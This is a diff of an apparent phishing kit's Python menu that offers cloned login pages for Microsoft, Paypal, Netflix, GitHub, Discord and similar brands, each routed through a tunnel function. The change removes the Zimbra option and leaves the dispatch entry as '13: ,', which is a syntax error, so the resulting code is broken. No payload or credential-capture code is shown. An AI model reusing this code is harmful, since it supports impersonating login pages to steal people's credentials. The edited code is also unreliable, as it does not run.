@@ -424,9 +424,6 @@ def gitlab():#11
 def github():#12
     website="github"
     tunnel_menu(website)
-def zimbra():#13
-    website="zimbra"
-    tunnel_menu(website)
 def tiktok():#14
     website="tiktok"
     tunnel_menu(website)
@@ -473,7 +470,7 @@ def menu():
 \033[0;34m[4]\033[m - Microsoft    \033[0;34m[5]\033[m - Wordpress     \033[0;34m[6]\033[m - Linkedin
 \033[0;34m[7]\033[m - Pinterest    \033[0;34m[8]\033[m - Netflix       \033[0;34m[9]\033[m - Paypal 
 \033[0;34m[10]\033[m- MercadoLivre \033[0;34m[11]\033[m- GitLab        \033[0;34m[12]\033[m- Github  
-\033[0;34m[13]\033[m- Zimbra       \033[0;34m[14]\033[m- TikTok        \033[0;34m[15]\033[m- Discord
+\033[0;34m[13]\033[m-        \033[0;34m[14]\033[m- TikTok        \033[0;34m[15]\033[m- Discord
 
 \033[0;34m[00]\033[m - CloneSite   \033[0;34m[99]\033[m - Sobre
         ''')
@@ -495,7 +492,7 @@ def menu():
         10: mercadolivre,
         11: gitlab,
         12: github,
-        13: zimbra,
+        13: ,
         14: tiktok,
         15: discord,
         00: clonesite,
